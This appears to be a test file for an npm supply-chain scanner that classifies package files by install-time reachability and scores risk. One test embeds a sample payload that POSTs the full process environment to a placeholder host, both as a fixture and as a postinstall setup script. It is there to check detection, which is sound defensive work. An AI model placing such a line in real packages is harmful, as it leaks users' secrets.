import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyFiles, TIER } from "../src/reachability.js";
import { analyze } from "../src/analyze.js";

const file = (name, source = "") => ({
  name: `package/${name}`,
  size: source.length,
  data: Buffer.from(source),
});

test("install hook entry point is classified as install-tier", () => {
  const tiers = classifyFiles(
    { scripts: { postinstall: "node scripts/setup.js" }, main: "index.js" },
    [file("scripts/setup.js", ""), file("index.js", "")],
  );
  assert.equal(tiers.get("scripts/setup.js"), TIER.INSTALL);
  assert.equal(tiers.get("index.js"), TIER.RUNTIME);
});

test("install-tier propagates through local requires", () => {
  const tiers = classifyFiles(
    { scripts: { preinstall: "node install.js" } },
    [
      file("install.js", `const h = require("./lib/helper");`),
      file("lib/helper.js", `const d = require("./deep.js");`),
      file("lib/deep.js", ""),
      file("unrelated.js", ""),
    ],
  );
  assert.equal(tiers.get("install.js"), TIER.INSTALL);
  assert.equal(tiers.get("lib/helper.js"), TIER.INSTALL);
  assert.equal(tiers.get("lib/deep.js"), TIER.INSTALL);
  assert.notEqual(tiers.get("unrelated.js"), TIER.INSTALL);
});

test("ESM imports are followed too", () => {
  const tiers = classifyFiles(
    { scripts: { install: "node boot.mjs" } },
    [file("boot.mjs", `import x from "./mod.js";`), file("mod.js", "")],
  );
  assert.equal(tiers.get("mod.js"), TIER.INSTALL);
});

test("bare specifiers are not resolved as local files", () => {
  const tiers = classifyFiles(
    { scripts: { install: "node boot.js" } },
    [file("boot.js", `require("express"); require("node:fs");`), file("express.js", "")],
  );
  // A local express.js must not be mistaken for the npm package.
  assert.notEqual(tiers.get("express.js"), TIER.INSTALL);
});

test("test and example directories are inert", () => {
  const tiers = classifyFiles({ main: "index.js" }, [
    file("index.js", ""),
    file("test/spec.js", ""),
    file("examples/demo.js", ""),
    file("fixtures/sample.js", ""),
  ]);
  assert.equal(tiers.get("test/spec.js"), TIER.INERT);
  assert.equal(tiers.get("examples/demo.js"), TIER.INERT);
  assert.equal(tiers.get("fixtures/sample.js"), TIER.INERT);
});

test("same payload scores far lower in a test fixture than at install time", () => {
  const payload = `
    const cp = require("child_process");
    fetch("https://dead.invalid/x", { method: "POST", body: JSON.stringify(process.env) });
  `;
  const base = {
    name: "some-package",
    version: "1.0.0",
    files: [],
    weeklyDownloads: 5000,
    createdAt: new Date(Date.now() - 400 * 86_400_000).toISOString(),
    versionPublishedAt: new Date(Date.now() - 100 * 86_400_000).toISOString(),
    maintainers: [{ name: "a" }, { name: "b" }],
    readme: "x".repeat(500),
  };

  const inFixture = analyze({
    ...base,
    manifest: { scripts: {}, main: "index.js" },
    files: [file("index.js", ""), file("test/fixtures/evil.js", payload)],
  });
  const atInstall = analyze({
    ...base,
    manifest: { scripts: { postinstall: "node setup.js" }, main: "index.js" },
    files: [file("index.js", ""), file("setup.js", payload)],
  });

  assert.ok(
    atInstall.score > inFixture.score * 2,
    `install-time payload (${atInstall.score}) should far outweigh fixture (${inFixture.score})`,
  );
  assert.equal(inFixture.verdict, "low-risk");
  assert.equal(atInstall.verdict, "suspicious");
});
